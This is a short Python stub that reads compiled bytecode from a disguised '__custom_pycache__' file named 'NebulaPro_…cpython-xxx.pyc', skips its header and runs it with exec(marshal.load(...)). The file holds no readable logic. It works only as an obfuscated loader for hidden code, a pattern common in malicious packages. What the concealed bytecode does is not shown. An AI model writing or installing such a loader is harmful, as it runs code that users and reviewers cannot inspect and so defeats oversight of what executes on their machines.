
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'NebulaPro_05e3960de2e9439999f39521c120e3df.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
